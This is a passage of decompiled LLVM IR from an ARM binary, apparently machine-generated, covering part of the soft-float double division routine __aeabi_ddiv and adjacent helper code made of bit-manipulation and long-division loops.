  %v7_1e0a8 = shl i32 %v1_1e0a8, %v1_1e0a4
  %v8_1e0a8 = or i32 %v7_1e0a8, %tmp7
  %v6_1e0ac = lshr i32 %v1_1e0a8, %v2_1e030
  %v1_1e0b0 = load i32, i32* @r1, align 4
  %v7_1e0b0 = shl i32 %v1_1e0b0, %v1_1e0a4
  %v8_1e0b0 = or i32 %v7_1e0b0, %v6_1e0ac
  %v6_1e0b4 = lshr i32 %v1_1e0b0, %v2_1e030
  %v1_1e0b8 = and i32 %v1_1e0b0, -2147483648
  store i32 %v1_1e0b8, i32* @r1, align 4
  %v7_1e0bc = lshr i32 %v1_1e0b8, %v2_1e030
  %v8_1e0bc = sub i32 -1, %v7_1e0bc
  %v9_1e0bc = and i32 %v6_1e0b4, %v8_1e0bc
  %tmp24 = icmp slt i32 %v8_1e0b0, 0
  %v4_1e0c0 = zext i1 %tmp24 to i32
  %v5_1e0c0 = add i32 %v4_1e0c0, %v9_1e0bc
  %v3_1e0c4 = mul i32 %v8_1e0b0, 2
  %v4_1e0c4 = or i32 %v8_1e0a8, %v3_1e0c4
  %v5_1e0c4 = icmp slt i32 %v4_1e0c4, 0
  store i1 %v5_1e0c4, i1* @cpsr_n, align 1
  %v6_1e0c4 = icmp eq i32 %v4_1e0c4, 0
  store i1 %v6_1e0c4, i1* @cpsr_z, align 1
  br i1 %v6_1e0c4, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1e0a4
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1e0c8 = add nsw i32 %tmp25, -1
  %v7_1e0c8 = and i32 %v5_1e0c0, %v6_1e0c8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1e0a4, %bb17
  %v1_1e0d0 = phi i32 [ %v5_1e0c0, %dec_label_pc_1e0a4 ], [ %v7_1e0c8, %bb17 ]
  %v2_1e0cc = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1e0cc, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1e0d0

dec_label_pc_1e190:                               ; preds = %dec_label_pc_1e014
  %v0_1e190 = load i32, i32* @r1, align 4
  %v1_1e190 = and i32 %v0_1e190, -2147483648
  %v1_1e198 = or i32 %v1_1e190, 2146435072
  store i32 %v1_1e198, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1e0c0, { 1, 0 }
  uselistorder i32 %v5_1e08c, { 1, 0, 2 }
  uselistorder i32 %v8_1e084, { 1, 0 }
  uselistorder i32 %v1_1e074, { 1, 0 }
  uselistorder i32 %v5_1e05c, { 1, 0 }
  uselistorder i32 %v1_1e050, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1e044, { 1, 0 }
  uselistorder i32 %v2_1e030, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1e02c, { 1, 0 }
  uselistorder i32 %v4_1e018, { 1, 2, 0 }
  uselistorder i32 %v0_1e018, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 46, 47, 66, 73, 8, 74, 77, 3, 1, 2, 78, 79, 5, 0, 4, 89, 27, 10, 31, 11, 12, 75, 76, 28, 29, 30, 72, 13, 90, 91, 9, 138, 139, 140, 141, 142, 144, 145, 143, 146, 147, 148, 149, 150, 151, 152, 14, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 15, 67, 68, 69, 70, 71, 32, 33, 16, 34, 35, 36, 65, 97, 37, 38, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 6, 80, 81, 82, 83, 84, 17, 85, 18, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 134, 127, 128, 129, 130, 131, 132, 133, 135, 136, 19, 137, 86, 7, 20, 21, 22, 24, 23, 25, 61, 87, 88, 26, 39, 40, 41, 42, 43, 44, 45, 62, 63, 64, 92, 93, 94, 95, 96, 98 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 3, 0, 1, 4, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1e1a8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1e1a8:
  %v1_1e1ac = or i32 %arg1, 2146959360
  store i32 %v1_1e1ac, i32* @r1, align 4
  %v1_1e1b4 = load i32, i32* @r0, align 4
  ret i32 %v1_1e1b4
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e1b8 = load i32, i32* @r4, align 4
  store i32 %v3_1e1b8, i32* %stack_var_-16, align 4
  %v6_1e1b8 = load i32, i32* @r5, align 4
  %v9_1e1b8 = load i32, i32* @r6, align 4
  %v12_1e1b8 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1e1c4 = load i32, i32* @r1, align 4
  %v4_1e1c4 = udiv i32 %v1_1e1c4, 1048576
  %v5_1e1c4 = urem i32 %v4_1e1c4, 2048
  store i32 %v5_1e1c4, i32* @r4, align 4
  %v6_1e1c4 = icmp eq i32 %v5_1e1c4, 0
  br i1 %v6_1e1c4, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1e1c8 = udiv i32 %arg4, 1048576
  %v6_1e1c8 = urem i32 %v5_1e1c8, 2048
  store i32 %v6_1e1c8, i32* %r5.global-to-local, align 4
  %v7_1e1c8 = icmp eq i32 %v6_1e1c8, 0
  br i1 %v7_1e1c8, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1e354

bb90:                                             ; preds = %bb
  %v5_1e1cc = icmp eq i32 %v5_1e1c4, 2047
  br i1 %v5_1e1cc, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1e1c8, %bb90 ]
  br label %dec_label_pc_1e354

bb91:                                             ; preds = %bb90
  %v5_1e1d0 = icmp eq i32 %v6_1e1c8, 2047
  br i1 %v5_1e1d0, label %dec_label_pc_1e354, label %dec_label_pc_1e1d8

dec_label_pc_1e1d8:                               ; preds = %bb91
  %v2_1e1d8 = sub nsw i32 %v5_1e1c4, %v6_1e1c8
  store i32 %v2_1e1d8, i32* %r4.global-to-local, align 4
  %v2_1e1dc = xor i32 %v1_1e1c4, %arg4
  %v4_1e1e0 = mul i32 %arg4, 4096
  %v5_1e1e0 = or i32 %v4_1e1e0, %arg3
  store i32 %v5_1e1e0, i32* %r5.global-to-local, align 4
  %v7_1e1e0 = icmp eq i32 %v5_1e1e0, 0
  %v3_1e1e4 = mul i32 %v1_1e1c4, 4096
  store i32 %v3_1e1e4, i32* %r1.global-to-local, align 4
  br i1 %v7_1e1e0, label %dec_label_pc_1e320, label %dec_label_pc_1e1ec

dec_label_pc_1e1ec:                               ; preds = %dec_label_pc_1e1d8
  %tmp92 = mul i32 %arg4, 256
  %v4_1e1f4 = and i32 %tmp92, 268435200
  %v4_1e1f8 = udiv i32 %arg3, 16777216
  %v5_1e1f4 = or i32 %v4_1e1f8, %v4_1e1f4
  %v5_1e1f8 = or i32 %v5_1e1f4, 268435456
  store i32 %v5_1e1f8, i32* %r3.global-to-local, align 4
  %v3_1e1fc = mul i32 %arg3, 256
  store i32 %v3_1e1fc, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1e1c4, 256
  %v4_1e200 = and i32 %tmp93, 268435200
  %v1_1e204 = load i32, i32* @r0, align 4
  %v4_1e204 = udiv i32 %v1_1e204, 16777216
  %v5_1e200 = or i32 %v4_1e200, %v4_1e204
  %v5_1e204 = or i32 %v5_1e200, 268435456
  store i32 %v5_1e204, i32* %r5.global-to-local, align 4
  %v3_1e208 = mul i32 %v1_1e204, 256
  store i32 %v3_1e208, i32* %r6.global-to-local, align 4
  %v1_1e20c = and i32 %v2_1e1dc, -2147483648
  store i32 %v1_1e20c, i32* %r1.global-to-local, align 4
  %v3_1e210 = icmp uge i32 %v5_1e204, %v5_1e1f8
  %v9_1e210 = icmp eq i32 %v5_1e204, %v5_1e1f8
  br i1 %v9_1e210, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1e1ec
  %v4_1e214 = icmp uge i32 %v3_1e208, %v3_1e1fc
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1e1ec, %bb94
  %v1_1e218 = phi i1 [ %v3_1e210, %dec_label_pc_1e1ec ], [ %v4_1e214, %bb94 ]
  %v2_1e218 = add nsw i32 %v2_1e1d8, 253
  %v3_1e218 = zext i1 %v1_1e218 to i32
  %v4_1e218 = add nsw i32 %v2_1e218, %v3_1e218
  %v8_1e218 = icmp ule i32 %v4_1e218, %v2_1e1d8
  %v9_1e218 = icmp ugt i32 %v2_1e1d8, -254
  %v10_1e218 = select i1 %v1_1e218, i1 %v8_1e218, i1 %v9_1e218
  %v1_1e21c = add nsw i32 %v4_1e218, 768
  store i32 %v1_1e21c, i32* %r4.global-to-local, align 4
  br i1 %v10_1e218, label %dec_label_pc_1e22c, label %dec_label_pc_1e224

dec_label_pc_1e224:                               ; preds = %bb95
  %v3_1e224 = udiv i32 %v5_1e1f8, 2
  store i32 %v3_1e224, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e22c

dec_label_pc_1e22c:                               ; preds = %bb95, %dec_label_pc_1e224
  %v0_1e234 = phi i32 [ %v5_1e1f8, %bb95 ], [ %v3_1e224, %dec_label_pc_1e224 ]
  %v0_1e238 = phi i32 [ %v3_1e1fc, %bb95 ], [ 0, %dec_label_pc_1e224 ]
  %v2_1e22c = sub i32 %v3_1e208, %v0_1e238
  store i32 %v2_1e22c, i32* %r6.global-to-local, align 4
  %v3_1e22c = icmp uge i32 %v3_1e208, %v0_1e238
  %v3_1e230 = icmp eq i1 %v3_1e22c, false
  %v4_1e230 = sub nsw i32 %v5_1e204, %v0_1e234
  %v6_1e230 = sext i1 %v3_1e230 to i32
  %v7_1e230 = add nsw i32 %v6_1e230, %v4_1e230
  store i32 %v7_1e230, i32* %r5.global-to-local, align 4
  %v3_1e234 = udiv i32 %v0_1e234, 2
  store i32 %v3_1e234, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e244.outer

dec_label_pc_1e244.outer:                         ; preds = %dec_label_pc_1e2dc, %dec_label_pc_1e22c
  %v1_1e2f0.ph = phi i32 [ %v2_1e2dc, %dec_label_pc_1e2dc ], [ %v1_1e20c, %dec_label_pc_1e22c ]
  %v0_1e248.ph = phi i32 [ %v5_1e2b8, %dec_label_pc_1e2dc ], [ %v7_1e230, %dec_label_pc_1e22c ]
  %v1_1e24c.ph = phi i32 [ %v3_1e2bc, %dec_label_pc_1e2dc ], [ %v2_1e22c, %dec_label_pc_1e22c ]
  %v5_1e2c417.ph = phi i32 [ %v5_1e2c4, %dec_label_pc_1e2dc ], [ %v3_1e234, %dec_label_pc_1e22c ]
  %v3_1e2c813.ph = phi i32 [ %v3_1e2c8, %dec_label_pc_1e2dc ], [ 0, %dec_label_pc_1e22c ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1e2dc ], [ 1048576, %dec_label_pc_1e22c ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1e2dc ], [ 524288, %dec_label_pc_1e22c ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1e244

dec_label_pc_1e244:                               ; preds = %dec_label_pc_1e244.outer, %dec_label_pc_1e2b4
  %v1_1e2a859 = phi i32 [ %v2_1e2f0, %dec_label_pc_1e2b4 ], [ %storemerge133, %dec_label_pc_1e244.outer ]
  %v1_1e254 = phi i32 [ %v1_1e25432, %dec_label_pc_1e2b4 ], [ %storemerge133, %dec_label_pc_1e244.outer ]
  %v1_1e27041 = phi i32 [ %v1_1e27043, %dec_label_pc_1e2b4 ], [ %storemerge133, %dec_label_pc_1e244.outer ]
  %v1_1e28c50 = phi i32 [ %v1_1e28c52, %dec_label_pc_1e2b4 ], [ %storemerge133, %dec_label_pc_1e244.outer ]
  %v0_1e2cc = phi i32 [ %v3_1e2cc, %dec_label_pc_1e2b4 ], [ %storemerge, %dec_label_pc_1e244.outer ]
  %v0_1e248 = phi i32 [ %v5_1e2b8, %dec_label_pc_1e2b4 ], [ %v0_1e248.ph, %dec_label_pc_1e244.outer ]
  %v1_1e24c = phi i32 [ %v3_1e2bc, %dec_label_pc_1e2b4 ], [ %v1_1e24c.ph, %dec_label_pc_1e244.outer ]
  %v5_1e2c417 = phi i32 [ %v5_1e2c4, %dec_label_pc_1e2b4 ], [ %v5_1e2c417.ph, %dec_label_pc_1e244.outer ]
  %v3_1e2c813 = phi i32 [ %v3_1e2c8, %dec_label_pc_1e2b4 ], [ %v3_1e2c813.ph, %dec_label_pc_1e244.outer ]
  %v3_1e244 = icmp uge i32 %v1_1e24c, %v3_1e2c813
  %v3_1e248 = icmp eq i1 %v3_1e244, false
  %v4_1e248 = sub i32 %v0_1e248, %v5_1e2c417
  %v6_1e248 = sext i1 %v3_1e248 to i32
  %v7_1e248 = add i32 %v6_1e248, %v4_1e248
  %v8_1e248 = zext i1 %v3_1e248 to i32
  %v9_1e248 = sub i32 %v7_1e248, %v8_1e248
  %v10_1e248 = icmp ult i32 %v0_1e248, %v9_1e248
  %v11_1e248 = icmp ne i32 %v5_1e2c417, -1
  %v12_1e248 = or i1 %v11_1e248, %v10_1e248
  %v13_1e248 = icmp ult i32 %v0_1e248, %v5_1e2c417
  %v14_1e248 = select i1 %v3_1e248, i1 %v12_1e248, i1 %v13_1e248
  br i1 %v14_1e248, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1e244
  %v3_1e24c = sub i32 %v1_1e24c, %v3_1e2c813
  store i32 %v3_1e24c, i32* %r6.global-to-local, align 4
  store i32 %v7_1e248, i32* %r5.global-to-local, align 4
  %v3_1e254 = or i32 %v1_1e254, %v0_1e2cc
  store i32 %v3_1e254, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1e244, %bb96
  %v1_1e2a858 = phi i32 [ %v1_1e2a859, %dec_label_pc_1e244 ], [ %v3_1e254, %bb96 ]
  %v1_1e25435 = phi i32 [ %v1_1e254, %dec_label_pc_1e244 ], [ %v3_1e254, %bb96 ]
  %v1_1e270 = phi i32 [ %v1_1e27041, %dec_label_pc_1e244 ], [ %v3_1e254, %bb96 ]
  %v1_1e28c49 = phi i32 [ %v1_1e28c50, %dec_label_pc_1e244 ], [ %v3_1e254, %bb96 ]
  %v0_1e264 = phi i32 [ %v0_1e248, %dec_label_pc_1e244 ], [ %v7_1e248, %bb96 ]
  %v1_1e268 = phi i32 [ %v1_1e24c, %dec_label_pc_1e244 ], [ %v3_1e24c, %bb96 ]
  %v1_1e258 = urem i32 %v5_1e2c417, 2
  %v2_1e258 = icmp ne i32 %v1_1e258, 0
  %v3_1e258 = udiv i32 %v5_1e2c417, 2
  %v3_1e25c = zext i1 %v2_1e258 to i32
  %v6_1e25c = zext i32 %v3_1e2c813 to i64
  %v7_1e25c = sub i32 33, %v3_1e2c813
  %v8_1e25c = zext i32 %v7_1e25c to i64
  %v9_1e25c = shl i64 %v6_1e25c, %v8_1e25c
  %v10_1e25c = sub i32 32, %v3_1e2c813
  %v11_1e25c = shl i32 %v3_1e25c, %v10_1e25c
  %v12_1e25c = zext i32 %v11_1e25c to i64
  %v14_1e25c = or i64 %v12_1e25c, %v9_1e25c
  %v15_1e25c = trunc i64 %v14_1e25c to i32
  %v3_1e260 = icmp uge i32 %v1_1e268, %v15_1e25c
  %v3_1e264 = icmp eq i1 %v3_1e260, false
  %v4_1e264 = sub i32 %v0_1e264, %v3_1e258
  %v6_1e264 = sext i1 %v3_1e264 to i32
  %v7_1e264 = add i32 %v6_1e264, %v4_1e264
  %v13_1e264 = icmp ult i32 %v0_1e264, %v3_1e258
  %v14_1e264 = or i1 %v13_1e264, %v3_1e264
  br i1 %v14_1e264, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1e268 = sub i32 %v1_1e268, %v15_1e25c
  store i32 %v3_1e268, i32* %r6.global-to-local, align 4
  store i32 %v7_1e264, i32* %r5.global-to-local, align 4
  %v5_1e270 = udiv i32 %v0_1e2cc, 2
  %v6_1e270 = or i32 %v1_1e270, %v5_1e270
  store i32 %v6_1e270, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1e2a857 = phi i32 [ %v1_1e2a858, %.thread4 ], [ %v6_1e270, %bb97 ]
  %v1_1e25434 = phi i32 [ %v1_1e25435, %.thread4 ], [ %v6_1e270, %bb97 ]
  %v1_1e27045 = phi i32 [ %v1_1e270, %.thread4 ], [ %v6_1e270, %bb97 ]
  %v1_1e28c = phi i32 [ %v1_1e28c49, %.thread4 ], [ %v6_1e270, %bb97 ]
  %v0_1e280 = phi i32 [ %v0_1e264, %.thread4 ], [ %v7_1e264, %bb97 ]
  %v1_1e284 = phi i32 [ %v1_1e268, %.thread4 ], [ %v3_1e268, %bb97 ]
  %v1_1e274 = urem i32 %v3_1e258, 2
  %v2_1e274 = icmp ne i32 %v1_1e274, 0
  %v3_1e274 = udiv i32 %v5_1e2c417, 4
  %v3_1e278 = zext i1 %v2_1e274 to i32
  %v6_1e278 = and i64 %v14_1e25c, 4294967295
  %v7_1e278 = sub i32 33, %v15_1e25c
  %v8_1e278 = zext i32 %v7_1e278 to i64
  %v9_1e278 = shl i64 %v6_1e278, %v8_1e278
  %v10_1e278 = sub i32 32, %v15_1e25c
  %v11_1e278 = shl i32 %v3_1e278, %v10_1e278
  %v12_1e278 = zext i32 %v11_1e278 to i64
  %v14_1e278 = or i64 %v12_1e278, %v9_1e278
  %v15_1e278 = trunc i64 %v14_1e278 to i32
  %v3_1e27c = icmp uge i32 %v1_1e284, %v15_1e278
  %v3_1e280 = icmp eq i1 %v3_1e27c, false
  %v4_1e280 = sub i32 %v0_1e280, %v3_1e274
  %v6_1e280 = sext i1 %v3_1e280 to i32
  %v7_1e280 = add i32 %v6_1e280, %v4_1e280
  %v13_1e280 = icmp ult i32 %v0_1e280, %v3_1e274
  %v14_1e280 = or i1 %v13_1e280, %v3_1e280
  br i1 %v14_1e280, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1e284 = sub i32 %v1_1e284, %v15_1e278
  store i32 %v3_1e284, i32* %r6.global-to-local, align 4
  store i32 %v7_1e280, i32* %r5.global-to-local, align 4
  %v5_1e28c = udiv i32 %v0_1e2cc, 4
  %v6_1e28c = or i32 %v1_1e28c, %v5_1e28c
  store i32 %v6_1e28c, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1e2a8 = phi i32 [ %v1_1e2a857, %.thread6 ], [ %v6_1e28c, %bb98 ]
  %v1_1e25433 = phi i32 [ %v1_1e25434, %.thread6 ], [ %v6_1e28c, %bb98 ]
  %v1_1e27044 = phi i32 [ %v1_1e27045, %.thread6 ], [ %v6_1e28c, %bb98 ]
  %v1_1e28c53 = phi i32 [ %v1_1e28c, %.thread6 ], [ %v6_1e28c, %bb98 ]
  %v0_1e29c = phi i32 [ %v0_1e280, %.thread6 ], [ %v7_1e280, %bb98 ]
  %v1_1e2a0 = phi i32 [ %v1_1e284, %.thread6 ], [ %v3_1e284, %bb98 ]
  %v1_1e290 = urem i32 %v3_1e274, 2
  %v2_1e290 = icmp ne i32 %v1_1e290, 0
  %v3_1e290 = udiv i32 %v5_1e2c417, 8
  %v3_1e294 = zext i1 %v2_1e290 to i32
  %v6_1e294 = and i64 %v14_1e278, 4294967295
  %v7_1e294 = sub i32 33, %v15_1e278
  %v8_1e294 = zext i32 %v7_1e294 to i64
  %v9_1e294 = shl i64 %v6_1e294, %v8_1e294
  %v10_1e294 = sub i32 32, %v15_1e278
  %v11_1e294 = shl i32 %v3_1e294, %v10_1e294
  %v12_1e294 = zext i32 %v11_1e294 to i64
  %v14_1e294 = or i64 %v12_1e294, %v9_1e294
  %v15_1e294 = trunc i64 %v14_1e294 to i32
  %v3_1e298 = icmp uge i32 %v1_1e2a0, %v15_1e294
  %v3_1e29c = icmp eq i1 %v3_1e298, false
  %v4_1e29c = sub i32 %v0_1e29c, %v3_1e290
  %v6_1e29c = sext i1 %v3_1e29c to i32
  %v7_1e29c = add i32 %v6_1e29c, %v4_1e29c
  %v13_1e29c = icmp ult i32 %v0_1e29c, %v3_1e290
  %v14_1e29c = or i1 %v13_1e29c, %v3_1e29c
  br i1 %v14_1e29c, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1e2a0 = sub i32 %v1_1e2a0, %v15_1e294
  store i32 %v3_1e2a0, i32* %r6.global-to-local, align 4
  store i32 %v7_1e29c, i32* %r5.global-to-local, align 4
  %v5_1e2a8 = udiv i32 %v0_1e2cc, 8
  %v6_1e2a8 = or i32 %v1_1e2a8, %v5_1e2a8
  store i32 %v6_1e2a8, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1e2b8 = phi i32 [ %v1_1e2a0, %.thread8 ], [ %v3_1e2a0, %bb100 ]
  %v0_1e2b4 = phi i32 [ %v0_1e29c, %.thread8 ], [ %v7_1e29c, %bb100 ]
  %v2_1e2f0 = phi i32 [ %v1_1e2a8, %.thread8 ], [ %v6_1e2a8, %bb100 ]
  %v1_1e25432 = phi i32 [ %v1_1e25433, %.thread8 ], [ %v6_1e2a8, %bb100 ]
  %v1_1e27043 = phi i32 [ %v1_1e27044, %.thread8 ], [ %v6_1e2a8, %bb100 ]
  %v1_1e28c52 = phi i32 [ %v1_1e28c53, %.thread8 ], [ %v6_1e2a8, %bb100 ]
  %v2_1e2ac = or i32 %v0_1e2b4, %v1_1e2b8
  %v4_1e2ac = icmp eq i32 %v2_1e2ac, 0
  br i1 %v4_1e2ac, label %dec_label_pc_1e2ec, label %dec_label_pc_1e2b4

dec_label_pc_1e2b4:                               ; preds = %.thread10
  %v3_1e2b4 = mul i32 %v0_1e2b4, 16
  %v4_1e2b8 = udiv i32 %v1_1e2b8, 268435456
  %v5_1e2b8 = or i32 %v3_1e2b4, %v4_1e2b8
  store i32 %v5_1e2b8, i32* %r5.global-to-local, align 4
  %v3_1e2bc = mul i32 %v1_1e2b8, 16
  store i32 %v3_1e2bc, i32* %r6.global-to-local, align 4
  %v3_1e2c0 = mul nuw i32 %v3_1e290, 8
  %v4_1e2c4 = udiv i32 %v15_1e294, 536870912
  %v5_1e2c4 = or i32 %v4_1e2c4, %v3_1e2c0
  %v3_1e2c8 = mul i32 %v15_1e294, 8
  %v3_1e2cc = udiv i32 %v0_1e2cc, 16
  store i32 %v3_1e2cc, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1e2cc, 16
  br i1 %tmp, label %dec_label_pc_1e2d4, label %dec_label_pc_1e244

dec_label_pc_1e2d4:                               ; preds = %dec_label_pc_1e2b4
  %v1_1e2d4 = and i32 %v1_1e2f0.ph, 1048576
  %v2_1e2d4 = icmp eq i32 %v1_1e2d4, 0
  br i1 %v2_1e2d4, label %dec_label_pc_1e2dc, label %.thread11.loopexit

dec_label_pc_1e2dc:                               ; preds = %dec_label_pc_1e2d4
  %v2_1e2dc = or i32 %v2_1e2f0, %v1_1e2f0.ph
  store i32 %v2_1e2dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e244.outer

dec_label_pc_1e2ec:                               ; preds = %.thread10
  store i32 %v15_1e294, i32* %r2.global-to-local, align 4
  store i32 %v3_1e290, i32* %r3.global-to-local, align 4
  %v1_1e2ec = and i32 %v1_1e2f0.ph, 1048576
  %v2_1e2ec = icmp eq i32 %v1_1e2ec, 0
  br i1 %v2_1e2ec, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1e2ec
  %v3_1e2f0 = or i32 %v2_1e2f0, %v1_1e2f0.ph
  store i32 %v3_1e2f0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1e2d4
  store i32 %v3_1e2c8, i32* %r2.global-to-local, align 4
  store i32 %v5_1e2c4, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1e2ec, %bb101
  %v1_1e2f8 = add nsw i32 %v4_1e218, 515
  store i32 %v1_1e2f8, i32* %ip.global-to-local, align 4
  %v2_1e2f8 = icmp ugt i32 %v1_1e21c, 252
  %v7_1e2f8 = icmp eq i32 %v1_1e21c, 253
  %v2_1e2fc = xor i1 %v7_1e2f8, true
  %v3_1e2fc = and i1 %v2_1e2f8, %v2_1e2fc
  br i1 %v3_1e2fc, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1e2fc = icmp ugt i32 %v1_1e2f8, 1791
  %v11_1e2fc = icmp eq i32 %v1_1e2f8, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1e300 = phi i1 [ %v7_1e2f8, %.thread11 ], [ %v11_1e2fc, %bb102 ]
  %v0_1e300 = phi i1 [ %v2_1e2f8, %.thread11 ], [ %v6_1e2fc, %bb102 ]
  %v2_1e300 = xor i1 %v1_1e300, true
  %v3_1e300 = and i1 %v0_1e300, %v2_1e300
  call void @__pseudo_cond_branch(i1 %v3_1e300, i32 ptrtoint (i32* @global_var_1e014.1241 to i32))
  %v0_1e304 = load i32, i32* %r5.global-to-local, align 4
  %v1_1e304 = load i32, i32* %r3.global-to-local, align 4
  %v2_1e304 = sub i32 %v0_1e304, %v1_1e304
  store i32 %v2_1e304, i32* %ip.global-to-local, align 4
  %v3_1e304 = icmp uge i32 %v0_1e304, %v1_1e304
  %v9_1e304 = icmp eq i32 %v0_1e304, %v1_1e304
  br i1 %v9_1e304, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1e308 = load i32, i32* %r6.global-to-local, align 4
  %v2_1e308 = load i32, i32* %r2.global-to-local, align 4
  %v3_1e308 = sub i32 %v1_1e308, %v2_1e308
  store i32 %v3_1e308, i32* %ip.global-to-local, align 4
  %v4_1e308 = icmp uge i32 %v1_1e308, %v2_1e308
  %v10_1e308 = icmp eq i32 %v1_1e308, %v2_1e308
  br i1 %v10_1e308, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1e30c = load i32, i32* %r0.global-to-local, align 4
  %v2_1e30c = urem i32 %v1_1e30c, 2
  %v3_1e30c = icmp ne i32 %v2_1e30c, 0
  %v4_1e30c = udiv i32 %v1_1e30c, 2
  store i32 %v4_1e30c, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1e310 = phi i1 [ %v3_1e304, %bb103 ], [ %v4_1e308, %bb104 ], [ %v3_1e30c, %bb105 ]
  %v0_1e310 = load i32, i32* %r0.global-to-local, align 4
  %v2_1e310 = zext i1 %v1_1e310 to i32
  %v3_1e310 = add i32 %v2_1e310, %v0_1e310
  store i32 %v3_1e310, i32* %r0.global-to-local, align 4
  %v0_1e314 = load i32, i32* %r1.global-to-local, align 4
  %v1_1e314 = load i32, i32* %r4.global-to-local, align 4
  %v2_1e314 = and i32 %v1_1e314, 4096
  %v3_1e314 = icmp ne i32 %v2_1e314, 0
  %v4_1e314 = mul i32 %v1_1e314, 1048576
  %v6_1e314 = add i32 %v4_1e314, %v0_1e314
  %v7_1e314 = zext i1 %v3_1e314 to i32
  %v8_1e314 = add i32 %v7_1e314, %v6_1e314
  store i32 %v8_1e314, i32* %r1.global-to-local, align 4
  %v2_1e318 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e318, i32* %r4.global-to-local, align 4
  store i32 %v6_1e1b8, i32* %r5.global-to-local, align 4
  store i32 %v9_1e1b8, i32* %r6.global-to-local, align 4
  ret i32 %v3_1e310

dec_label_pc_1e320:                               ; preds = %dec_label_pc_1e1d8
  %v1_1e320 = and i32 %v2_1e1dc, -2147483648
  %v4_1e324 = urem i32 %v1_1e1c4, 1048576
  %v5_1e324 = or i32 %v1_1e320, %v4_1e324
  store i32 %v5_1e324, i32* %r1.global-to-local, align 4
  %v6_1e328 = add nsw i32 %v2_1e1d8, 1023
  store i32 %v6_1e328, i32* %r4.global-to-local, align 4
  %v8_1e328 = sub nsw i32 0, %v2_1e1d8
